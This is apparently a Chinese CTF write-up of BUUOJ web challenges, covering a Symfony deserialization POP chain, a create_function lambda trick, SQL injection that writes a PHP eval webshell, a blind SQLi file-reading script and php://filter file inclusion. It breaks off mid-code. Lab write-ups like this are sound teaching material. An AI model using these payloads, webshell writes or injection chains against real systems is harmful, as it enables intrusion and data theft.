<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//backup in source.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">\Illuminate\Http\Request <span class="variable">$request</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$payload</span>=<span class="variable">$request</span>-&gt;input(<span class="string">&quot;payload&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$payload</span>))&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            @unserialize(<span class="variable">$payload</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码很简单，下载source.tar.gz  很明显是让找POP链，最后能读取文件即可</p>
<p>既然直接给了一个unserialize，其他的什么都没有，所以首先考虑魔法函数<code>__destruct</code></p>
<p>那么我们在全局搜索一下<code>__destruct</code>，找到的可利用类是TagAwareAdapter类</p>
<p>这个类里面有一个<code>__destruct</code>方法，调用了commit方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;commit();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>之后commit方法又调用了invalidateTags这个方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;invalidateTags([]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>我们跟进invalidateTags这个方法看看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invalidateTags</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$tags</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ok</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$tagsByKey</span> = [];</span><br><span class="line">        <span class="variable">$invalidatedTags</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$tags</span> <span class="keyword">as</span> <span class="variable">$tag</span>) &#123;</span><br><span class="line">            CacheItem::validateKey(<span class="variable">$tag</span>);</span><br><span class="line">            <span class="variable">$invalidatedTags</span>[<span class="variable">$tag</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;deferred) &#123;</span><br><span class="line">            <span class="variable">$items</span> = <span class="keyword">$this</span>-&gt;deferred;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$items</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$item</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred(<span class="variable">$item</span>)) &#123;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;deferred[<span class="variable">$key</span>]);</span><br><span class="line">                    <span class="variable">$ok</span> = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$f</span> = <span class="keyword">$this</span>-&gt;getTagsByKey;</span><br><span class="line">            <span class="variable">$tagsByKey</span> = <span class="variable">$f</span>(<span class="variable">$items</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$tagVersions</span> = <span class="keyword">$this</span>-&gt;getTagVersions(<span class="variable">$tagsByKey</span>, <span class="variable">$invalidatedTags</span>);</span><br><span class="line">        <span class="variable">$f</span> = <span class="keyword">$this</span>-&gt;createCacheItem;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$tagsByKey</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$tags</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred(<span class="variable">$f</span>(<span class="built_in">static</span>::TAGS_PREFIX.<span class="variable">$key</span>, array_intersect_key(<span class="variable">$tagVersions</span>, <span class="variable">$tags</span>), <span class="variable">$items</span>[<span class="variable">$key</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ok</span> = <span class="keyword">$this</span>-&gt;pool-&gt;commit() &amp;&amp; <span class="variable">$ok</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$invalidatedTags</span>) &#123;</span><br><span class="line">            <span class="variable">$f</span> = <span class="keyword">$this</span>-&gt;invalidateTags;</span><br><span class="line">            <span class="variable">$ok</span> = <span class="variable">$f</span>(<span class="keyword">$this</span>-&gt;tags, <span class="variable">$invalidatedTags</span>) &amp;&amp; <span class="variable">$ok</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ok</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>要注意的是，我们可以控制整个TagAwareAdapter类中的成员变量，所以我们可以控制所有的$this-&gt;xxx这样子的变量。</p>
<p>在这一段代码中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$items</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$item</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred(<span class="variable">$item</span>)) &#123;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;deferred[<span class="variable">$key</span>]);</span><br><span class="line">                    <span class="variable">$ok</span> = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>我们可以发现，我们可以调用任意一个实现了saveDeferred方法的类，所以我们可以找一个可利用类为：PhpArrayAdapter类</p>
<p>我们看一下这个类中的saveDeffer方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveDeferred</span>(<span class="params">CacheItemInterface <span class="variable">$item</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> === <span class="keyword">$this</span>-&gt;values) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;initialize();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;keys[<span class="variable">$item</span>-&gt;getKey()]) &amp;&amp; <span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred(<span class="variable">$item</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>进入到initialize这个方法，发现在本类中并没有定义，而是在一个trait这个关键词修饰的类中<code>trait PhpArrayTrait</code></p>
<p><strong>看一下trait这个关键词的用法</strong></p>
<blockquote>
<p><strong>trait</strong></p>
</blockquote>
<p><strong>这个关键词是php为了解决单继承的问题而特意建立的，在java这种面向对象的语言中，继承都是单继承的，一个类只能继承一个父类，这样确实体现了面向对象的思想，但是单继承在有的时候不是很方便</strong></p>
<p><strong>我们通过phpstorm的继承图生成可以清楚的看到PhpArrayAdapter这个类的继承关系</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu48.jpg"></p>
<p>那么在本类中没有定义initialize这个方法的话，自然就会去父类中寻找，我们来看看父类的initialize方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">initialize</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">$this</span>-&gt;values = [];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$values</span> = (<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;file) ?: [[], []];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">2</span> !== \count(<span class="variable">$values</span>) || !<span class="keyword">isset</span>(<span class="variable">$values</span>[<span class="number">0</span>], <span class="variable">$values</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">$this</span>-&gt;values = [];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">list</span>(<span class="keyword">$this</span>-&gt;keys, <span class="keyword">$this</span>-&gt;values) = <span class="variable">$values</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>我们可以在PhpArrayAdapter中定义好<code>$this-&gt;file</code>这个变量，那么在调用initialize方法的时候，只要这个file是一个存在的文件，就会调用include来包含进去，最后就可以读取到flag了</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$file</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$deferred</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$pool</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = <span class="keyword">array</span>(<span class="string">&#x27;xxx&#x27;</span> =&gt; <span class="keyword">new</span> CacheItem());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> PhpArrayAdapter();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> TagAwareAdapter();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#这两个类都是在Symfony\Component\Cache\Adapter命名空间下的</span></span><br><span class="line"><span class="comment">#而Cacheitem类则不在同一个类下。所以我们得新建一个命名空间。并且use导入</span></span><br></pre></td></tr></table></figure>


<h2 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h2><p><strong>知识点：匿名创建函数</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$MY</span> = create_function(<span class="string">&quot;&quot;</span>,<span class="string">&quot;die(`cat flag.php`);&quot;</span>);</span><br><span class="line"><span class="variable">$hash</span> = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;function SUCTF_<span class="subst">$hash</span>()&#123;&quot;</span></span><br><span class="line">    .<span class="string">&quot;global \$MY;&quot;</span></span><br><span class="line">    .<span class="string">&quot;\$MY();&quot;</span></span><br><span class="line">    .<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_GET</span>[<span class="string">&quot;func_name&quot;</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>首先创建了一个<code>$MY</code>的匿名函数。会输出flag<br>然后创建<code>$hash</code>会在eval函数中。与SUCTF拼接。形成一个新的函数名<br>要想拿到flag就只有调用SUCTF_XXXX随机数的函数名。或者直接调用<code>$MY</code></p>
<blockquote>
<p><strong>create_function()函数漏洞，create之后会自动生成一个函数名为%00lambda_%d</strong></p>
<p><strong><code>%d </code>这个值是一直递增的，这里的 <code>%d </code>会一直递增到最大长度直到结束，这里我们可以通过大量的请求来迫使 <code>Pre-fork </code>模式启动的Apache启动新的线程，这样这里的%d会刷新为1，就可以预测了。</strong></p>
</blockquote>
<p>paylaod</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    r=requests.get(<span class="string">&#x27;http://aecc2d1e-5c1a-4132-9754-71ada6af6b59.node3.buuoj.cn/?func_name=%00lambda_1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&#x27;Testing.......&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="SUCTF-2018-MultiSQL"><a href="#SUCTF-2018-MultiSQL" class="headerlink" title="[SUCTF 2018]MultiSQL"></a>[SUCTF 2018]MultiSQL</h2><p>知识点 ：</p>
<ol>
<li>sql预编译</li>
<li>写文件getshell</li>
</ol>
<p>注册登入后在/user/user.php?id= 处存在注入点</p>
<p>fuzz测试后发现过滤了<code>union，select ，&amp;，|</code>，过滤了select然后存在堆叠注入的可以使用预处理注入，尝试写入shell，方法一hex编码</p>
<blockquote>
<p>SELECT ‘<?php @eval($_POST[1]);?>‘ into outfile ‘/var/www/html/favicon/1.php’</p>
</blockquote>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">user</span>/user.php?id=<span class="number">2</span>;set @xx=<span class="number">0</span>x<span class="number">53454</span>c<span class="number">45435420273</span>c<span class="number">3</span>f<span class="number">70687020406576616</span>c<span class="number">28245</span>f<span class="number">504</span>f<span class="number">53545</span>b<span class="number">315</span>d<span class="number">293</span>b<span class="number">3</span>f<span class="number">3</span>e<span class="number">2720696</span>e<span class="number">746</span>f<span class="number">206</span>f<span class="number">757466696</span>c<span class="number">6520272</span>f<span class="number">7661722</span>f<span class="number">7777772</span>f<span class="number">68746</span>d<span class="number">6</span>c<span class="number">2</span>f<span class="number">66617669636</span>f<span class="number">6</span>e<span class="number">2</span>f<span class="number">312</span>e<span class="number">70687027</span>;prepare x from @xx;execute x;</span><br></pre></td></tr></table></figure>
<p>之后在favicon/1.php 页面 ，POST传参命令执行即可</p>
<p>方法二 char()编码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span>=<span class="string">&quot;select &#x27;&lt;?php eval($_POST[_]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell.php&#x27;;&quot;</span></span><br><span class="line">len_str=<span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,len_str):</span><br><span class="line">	<span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">		print(<span class="string">&#x27;char(%s&#x27;</span>%<span class="built_in">ord</span>(<span class="built_in">str</span>[i]),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(<span class="string">&#x27;,%s&#x27;</span>%<span class="built_in">ord</span>(<span class="built_in">str</span>[i]),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="string">&#x27;)&#x27;</span>)</span><br></pre></td></tr></table></figure>


<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">2</span>;<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="type">char</span>(<span class="number">115</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">60</span>,<span class="number">63</span>,<span class="number">112</span>,<span class="number">104</span>,<span class="number">112</span>,<span class="number">32</span>,<span class="number">101</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">40</span>,<span class="number">36</span>,<span class="number">95</span>,<span class="number">80</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">91</span>,<span class="number">95</span>,<span class="number">93</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">63</span>,<span class="number">62</span>,<span class="number">39</span>,<span class="number">32</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">32</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">116</span>,<span class="number">102</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">47</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">47</span>,<span class="number">119</span>,<span class="number">119</span>,<span class="number">119</span>,<span class="number">47</span>,<span class="number">104</span>,<span class="number">116</span>,<span class="number">109</span>,<span class="number">108</span>,<span class="number">47</span>,<span class="number">102</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">105</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">47</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">104</span>,<span class="number">112</span>,<span class="number">39</span>,<span class="number">59</span>);<span class="keyword">prepare</span> query <span class="keyword">from</span> @<span class="keyword">sql</span>;<span class="keyword">execute</span> query;</span><br></pre></td></tr></table></figure>


<hr>
<p>还可以文件读取，不过读不到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;p5cm28cnklnclpvk346o9od5b5&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data=<span class="string">&#x27;0x&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">r=requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9999</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="comment">#print (i)</span></span><br><span class="line">        url=<span class="string">&#x27;http://9f68062c-bd5d-4812-8ff1-fd1e0226e3dc.node3.buuoj.cn/user/user.php?id=0^(hex(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870))&lt;&#x27;</span>+data+<span class="built_in">str</span>(<span class="built_in">hex</span>(i)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">        print(url)</span><br><span class="line">        result=r.get(url=url,cookies=cookies).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">            data+=<span class="built_in">str</span>(<span class="built_in">hex</span>(i-<span class="number">1</span>)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            flag+=(<span class="built_in">chr</span>(i-<span class="number">1</span>))</span><br><span class="line">            <span class="built_in">print</span> (flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>


<h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>知识点：</p>
<ol>
<li>命令执行</li>
<li>伪协议</li>
</ol>
<p>登入页面抓包，发现login.php，因此猜测存在register.php</p>
<p>访问register.php,注册 – &gt; 登录，看到<code>user.php?page=</code></p>
<p>直接伪协议读取文件，由于page=guest，猜测真实文件就是guest.php，那么我们直接写index就好了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] ))&#123;</span><br><span class="line">    Header(<span class="string">&quot;Location: user.php?page=info&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;templates/index.html&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">function.php</span><br><span class="line"><span class="comment">//这里只放部分代码</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Hacker</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Header(<span class="string">&quot;Location: hacker.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$keywords</span> = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;manage&quot;</span>,<span class="string">&quot;ffffllllaaaaggg&quot;</span>];</span><br><span class="line">    <span class="variable">$uri</span> = parse_url(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">    parse_str(<span class="variable">$uri</span>[<span class="string">&#x27;query&#x27;</span>], <span class="variable">$query</span>);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$keywords</span> <span class="keyword">as</span> <span class="variable">$token</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (stristr(<span class="variable">$k</span>, <span class="variable">$token</span>))</span><br><span class="line">                hacker();</span><br><span class="line">            <span class="keyword">if</span> (stristr(<span class="variable">$v</span>, <span class="variable">$token</span>))</span><br><span class="line">                hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在function.php 中使用parse_url和parse_str来判断URL中是否有危险字符。<br>而parse_url都是可以绕过了。在域名后面多加两个/即可绕过，我们尝试读取ffffllllaaaaggg</p>
<blockquote>
<p><a href="http://xxx///user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg">http://xxx///user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</a></p>
</blockquote>
<p>读取到这个文件了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (FLAG_SIG != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;you can not visit it directly&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you can find sth in m4aaannngggeee&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1234567</span></span><br></pre></td></tr></table></figure>
<p>继续读取<code>m4aaannngggeee</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (FLAG_SIG != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;you can not visit it directly&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;templates/upload.html&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1234567</span></span><br></pre></td></tr></table></figure>
<p>访问<code>http://e6cd3ddc-023e-46e1-a2ee-f2b6a66d576f.node3.buuoj.cn/templates/upload.html</code></p>
<p>是个文件上传的页面，不过我们尝试文件上传后发现404报错，根据报错信息知道存在upllloadddd.php，用之前的伪协议读取这个文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$allowtype</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpg&quot;</span>);</span><br><span class="line"><span class="variable">$size</span> = <span class="number">10000000</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$path</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error:can not move&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error:not an upload file！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$newfile</span> = <span class="variable">$path</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;file upload success&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$picdata</span> = system(<span class="string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot; | base64 -w 0&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.<span class="variable">$picdata</span>.<span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    unlink(<span class="variable">$newfile</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Upload file error: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ext</span> = array_pop(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(!in_array(<span class="variable">$ext</span>,<span class="variable">$allowtype</span>))&#123;</span><br><span class="line">    